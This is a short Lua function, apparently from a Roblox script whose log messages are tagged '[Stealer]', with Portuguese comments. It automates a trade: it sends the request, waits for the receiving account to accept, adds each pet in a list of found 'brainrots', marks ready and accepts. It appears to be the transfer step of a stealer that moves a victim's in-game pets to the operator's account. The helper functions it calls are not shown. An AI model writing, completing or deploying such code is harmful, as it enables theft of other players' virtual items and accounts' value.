local function executeTrade()
    -- 1. Envia pedido
    local success, result = sendTradeRequest()
    if not success then
        print("[Stealer] ❌ Falha ao enviar pedido: " .. tostring(result))
        return false
    end
    print("[Stealer] ✅ Pedido enviado!")

    -- 2. Aguarda a trade iniciar (espera o remote de AcceptInvite ser chamado)
    -- Ou simplesmente espera um tempo para você aceitar manualmente
    print("[Stealer] Aguardando você aceitar o pedido...")
    task.wait(5)

    -- 3. Adiciona brainrots (um por um, com cooldown de 5 segundos)
    print("[Stealer] Adicionando brainrots...")
    for i, pet in ipairs(foundBrainrots) do
        print("[Stealer] Adicionando: " .. pet.name .. " (" .. i .. "/" .. #foundBrainrots .. ")")
        local ok, err = addBrainrot(pet)
        if ok then
            print("[Stealer] ✅ " .. pet.name .. " adicionado!")
        else
            print("[Stealer] ❌ Falha ao adicionar " .. pet.name .. ": " .. tostring(err))
        end
        if i < #foundBrainrots then
            print("[Stealer] Aguardando cooldown de 5 segundos...")
            task.wait(5)
        end
    end

    -- 4. Clica em Ready
    print("[Stealer] Clicando em Ready...")
    setReady()
    task.wait(1)

    -- 5. Aguarda o outro lado ficar pronto (ou simplesmente aceita)
    print("[Stealer] Aguardando confirmação do outro lado...")
    task.wait(3)

    -- 6. Aceita a trade
    print("[Stealer] Aceitando trade...")
    acceptTrade()

    print("[Stealer] ✅ Trade concluída com sucesso!")
    return true
end

